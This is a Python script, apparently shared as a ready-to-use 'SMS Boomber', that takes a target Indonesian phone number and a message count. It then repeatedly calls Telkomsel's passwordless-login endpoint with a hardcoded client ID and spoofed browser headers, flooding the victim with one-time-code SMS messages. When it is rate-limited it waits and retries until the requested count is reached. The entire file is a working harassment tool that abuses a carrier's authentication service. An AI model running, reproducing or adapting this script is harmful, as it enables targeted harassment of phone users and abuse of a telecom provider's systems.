#!/bin/usr/python3.8.x
# coding=utf-8
# SMS Boomber for Indonesian number phone

import os,sys,requests
from time import sleep

header = {'Auth0-Client':'eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiNy42LjEifQ',
	'Origin':'https://my.telkomsel.com',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'en-US,en;q=0.9',
	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
	'Content-Type':'application/x-www-form-urlencoded',
	'Accept':'application/json, text/javascripte',
	'Referer':'https://my.telkomsel.com/',
	'Connection':'keep-alive'}

def logo():
	print("""
\033[1;97m|\033[1;96m--------------------------------\033[1;97m|
\033[1;91m ╔═╗\033[1;90m╔╦╗╔═╗  \033[1;91m╔╗ \033[1;90m┌─┐┌─┐┌┬┐┌┐ ┌─┐┬─┐
\033[1;91m ╚═╗\033[1;90m║║║╚═╗  \033[1;91m╠╩╗\033[1;90m│ ││ ││││├┴┐├┤ ├┬┘
\033[1;91m ╚═╝\033[1;90m╩ ╩╚═╝  \033[1;91m╚═╝\033[1;90m└─┘└─┘┴ ┴└─┘└─┘┴└─
\033[1;97m|\033[1;96m--------------------------------\033[1;97m|
 \033[47;1;91m        Coded By : LeON         \033[0m
	""")

class Main:
	def __init__(self):
		self.menu()
		
	def menu(self):
		os.system('clear')
		logo()
		print("""
    \033[1;97m{\033[1;96m01\033[1;97m}\033[1;91m---\033[1;97mBoomber Operator Telkomsel
    \033[1;97m{\033[1;96m02\033[1;97m}\033[1;91m---\033[1;97mBoomber SMS v1
    \033[1;97m{\033[1;96m03\033[1;97m}\033[1;91m---\033[1;97mBack to main menu
    \033[1;97m{\033[1;91mx\033[1;97m}\033[1;91m----Exit from Programs
		""")
		while True:
			choose=input("\033[1;97m   hurt/\033[1;92mSmsBoomber\033[1;97m >\033[1;90m ")
			if choose in ['1','01']:
				sleep(1)
				Main.v1()
			elif choose in ['2','02']:
				sleep(1)
				Main.v1()
			elif choose in ['3','03']:
				sleep(1)
				os.system('python hurt.py')
			elif 'x' in choose:
				sleep(1)
				print("\033[1;91mExit from programs!")
				sys.exit()
				exit()
			else:
				sleep(1)
				print("\033[1;91mPlease enter a number...")
		
	def v1():
		try:
			os.system('clear')
			logo()
			print("\033[1;91m• \033[1;97mEnter target number (ex..: 62812345xxxxx)")
			print()
			num=input("\033[1;97m[\033[1;91m?\033[1;97m]\033[1;92m Target Number \033[1;97m:\033[1;96m ")
			total=input("\033[1;97m[\033[1;91m?\033[1;97m]\033[1;92m Jumlah        \033[1;97m:\033[1;96m ")
			x=header
			dat={'client_id':'Xlj9pkfK6yYumf6G8KE2S5TDWgTtczb0','phone_number':'+'+num,'connection':'sms'}
			datas=dat
			lmt = int(0)
			while lmt < int(total):
				lmt+=1
				post=requests.post("https://tdwidm.telkomsel.com/passwordless/start",data=datas,headers=x)
				if post.status_code == 200:
					print("\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Sending sms for "+str(num))
					sleep(0.5)
				else:
					print("\033[1;97m[\033[1;91mX\033[1;97m]\033[1;91m Limits sending, wait a 1 minute")
					lmt-=1
					sleep(60)
		except (KeyboardInterrupt, EOFError):
			print("\033[0mExiting...")
			sys.exit()
		except Exception as ER:
			print("\033[91merr : %s"%(ER))
			sys.exit()
			
Main()
